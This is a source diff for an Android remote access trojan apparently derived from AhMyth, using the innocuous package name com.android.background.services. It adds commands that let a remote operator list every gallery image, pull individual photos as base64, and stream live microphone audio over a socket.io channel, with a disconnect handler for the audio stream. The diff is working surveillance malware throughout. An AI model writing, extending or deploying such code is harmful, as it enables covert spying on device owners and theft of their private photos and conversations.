@@ -1,12 +1,26 @@
 package com.android.background.services;
 
+import android.Manifest;
 import android.annotation.SuppressLint;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.media.AudioFormat;
+import android.media.AudioRecord;
+import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.Build;
+import android.os.Environment;
 import android.os.Looper;
+import android.provider.MediaStore;
+import android.util.Base64;
 import android.util.Log;
+
+import androidx.core.content.ContextCompat;
 
 import com.android.background.services.helpers.AppsListManager;
 import com.android.background.services.helpers.CallsManager;
@@ -19,11 +33,16 @@ import com.android.background.services.helpers.SMSManager;
 import com.android.background.services.helpers.ScreenManager;
 
 import org.apache.commons.io.FileUtils;
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.util.ArrayList;
+import java.util.Arrays;
 
+import io.socket.client.Socket;
 import io.socket.emitter.Emitter;
 
 public class ConnectionManager {
@@ -57,6 +76,14 @@ public class ConnectionManager {
                 @Override
                 public void call(Object... args) {
                     ioSocket.emit("pong");
+                }
+            });
+
+            ioSocket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    // Never leave the mic recording into a dead socket.
+                    stopMicStream();
                 }
             });
 
@@ -129,6 +156,15 @@ public class ConnectionManager {
                                 break;
                             case "x0000sc":
                                 x0000sc();
+                                break;
+                            case "x0000getAllImages":
+                                x0000getAllImages();
+                                break;
+                            case "x0000getImage":
+                                x0000getImage(data.getString("path"), data.optString("name", null));
+                                break;
+                            case "x0000listenMic":
+                                x0000listenMic();
                                 break;
                         }
                     } catch (Exception e) {
@@ -404,5 +440,173 @@ public class ConnectionManager {
             location.put("enable", false);
 
         ioSocket.emit("x0000lm", location);
+    }
+
+    // ---------------------------------------------------------------------
+    // Gallery dump (inherited from AhMyth-Plus, modernized)
+    // ---------------------------------------------------------------------
+
+    public static void x0000getAllImages() throws JSONException {
+        JSONArray images = new JSONArray();
+        ContentResolver cr = context.getContentResolver();
+        ArrayList<String> projection = new ArrayList<>();
+        projection.add(MediaStore.Images.Media._ID);
+        projection.add(MediaStore.Images.Media.DISPLAY_NAME);
+        projection.add(MediaStore.Images.Media.SIZE);
+        projection.add(MediaStore.Images.Media.DATE_ADDED);
+        // RELATIVE_PATH (API 29+) avoids the deprecated DATA column entirely.
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+            projection.add(MediaStore.Images.Media.RELATIVE_PATH);
+        Uri collection = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
+                ? MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
+                : MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
+        try (Cursor c = cr.query(collection, projection.toArray(new String[0]), null, null, sortOrder)) {
+            if (c != null) {
+                int idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
+                int nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
+                int sizeCol = c.getColumnIndex(MediaStore.Images.Media.SIZE);
+                int dateCol = c.getColumnIndex(MediaStore.Images.Media.DATE_ADDED);
+                int relCol = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
+                        ? c.getColumnIndex(MediaStore.Images.Media.RELATIVE_PATH) : -1;
+                while (c.moveToNext()) {
+                    String name = c.getString(nameCol);
+                    String relPath = relCol >= 0 ? c.getString(relCol) : null;
+                    String path = null;
+                    if (relPath != null && name != null) {
+                        path = Environment.getExternalStorageDirectory().getAbsolutePath()
+                                + "/" + relPath;
+                        if (!path.endsWith("/")) path += "/";
+                        path += name;
+                    } else {
+                        // pre-Q fallback: the DATA column still exists there
+                        // (deprecated only for read access on API 29+).
+                        int dataCol = c.getColumnIndex(MediaStore.Images.Media.DATA);
+                        if (dataCol >= 0) path = c.getString(dataCol);
+                    }
+                    JSONObject o = new JSONObject();
+                    o.put("id", c.getLong(idCol));
+                    o.put("imageName", name != null ? name : "image_" + c.getLong(idCol) + ".jpg");
+                    o.put("imagePath", path != null ? path : "");
+                    if (sizeCol >= 0) o.put("imageSize", c.getLong(sizeCol));
+                    if (dateCol >= 0) o.put("imageDate", c.getLong(dateCol));
+                    images.put(o);
+                }
+            }
+        }
+        JSONObject out = new JSONObject();
+        out.put("imageCount", images.length());
+        out.put("images", images);
+        ioSocket.emit("x0000getAllImages", out);
+    }
+
+    public static void x0000getImage(String path, String name) throws JSONException {
+        JSONObject out = new JSONObject();
+        out.put("image", false);
+        out.put("error", "image not found");
+        if (path == null || path.isEmpty()) {
+            ioSocket.emit("x0000getImage", out);
+            return;
+        }
+        Bitmap bmp = null;
+        try {
+            BitmapFactory.Options bounds = new BitmapFactory.Options();
+            bounds.inJustDecodeBounds = true;
+            BitmapFactory.decodeFile(path, bounds);
+            int sample = 1;
+            int maxDim = 1280;
+            while (Math.max(bounds.outWidth, bounds.outHeight) / (sample * 2) >= maxDim)
+                sample *= 2;
+            BitmapFactory.Options opts = new BitmapFactory.Options();
+            opts.inSampleSize = sample;
+            bmp = BitmapFactory.decodeFile(path, opts);
+        } catch (Exception e) {
+            // fall through with null bitmap -> explicit error response
+        }
+        if (bmp == null) {
+            ioSocket.emit("x0000getImage", out);
+            return;
+        }
+        try {
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            bmp.compress(Bitmap.CompressFormat.JPEG, 70, bos);
+            String b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP);
+            out = new JSONObject();
+            out.put("image", true);
+            out.put("imageName", name != null ? name : "image.jpg");
+            out.put("base64", b64);
+            ioSocket.emit("x0000getImage", out);
+        } finally {
+            bmp.recycle();
+        }
+    }
+
+    // ---------------------------------------------------------------------
+    // Real-time microphone streaming (inherited from AhMyth-Plus, modernized)
+    // ---------------------------------------------------------------------
+
+    private static final int MIC_STREAM_RATE = 16000;
+    private static final int MIC_STREAM_CHUNK = 4096;
+    private static volatile AudioRecord micStreamRecord;
+    private static volatile Thread micStreamThread;
+    private static volatile boolean micStreaming;
+
+    private static void x0000listenMic() {
+        if (micStreaming) {
+            stopMicStream();
+            ioSocket.emit("audioDataStop", "stop");
+            return;
+        }
+        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
+                != PackageManager.PERMISSION_GRANTED) {
+            ioSocket.emit("audioDataStop", "mic permission denied");
+            return;
+        }
+        try {
+            int minBuf = AudioRecord.getMinBufferSize(
+                    MIC_STREAM_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
+            int bufSize = Math.max(minBuf, MIC_STREAM_CHUNK);
+            AudioRecord rec = new AudioRecord(MediaRecorder.AudioSource.MIC, MIC_STREAM_RATE,
+                    AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize);
+            if (rec.getState() != AudioRecord.STATE_INITIALIZED) {
+                rec.release();
+                ioSocket.emit("audioDataStop", "mic init failed");
+                return;
+            }
+            micStreamRecord = rec;
+            micStreaming = true;
+            rec.startRecording();
+            micStreamThread = new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    byte[] chunk = new byte[MIC_STREAM_CHUNK];
+                    while (micStreaming) {
+                        int read = rec.read(chunk, 0, chunk.length);
+                        if (read > 0) {
+                            byte[] data = Arrays.copyOf(chunk, read);
+                            String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
+                            ioSocket.emit("audioData", b64);
+                        }
+                    }
+                }
+            }, "mic-stream");
+            micStreamThread.start();
+        } catch (Exception e) {
+            micStreaming = false;
+            ioSocket.emit("audioDataStop", "mic error: " + e.getMessage());
+        }
+    }
+
+    private static void stopMicStream() {
+        micStreaming = false;
+        if (micStreamThread != null) {
+            micStreamThread.interrupt();
+            micStreamThread = null;
+        }
+        if (micStreamRecord != null) {
+            try { micStreamRecord.stop(); } catch (Exception ignored) { }
+            micStreamRecord.release();
+            micStreamRecord = null;
+        }
     }
 }
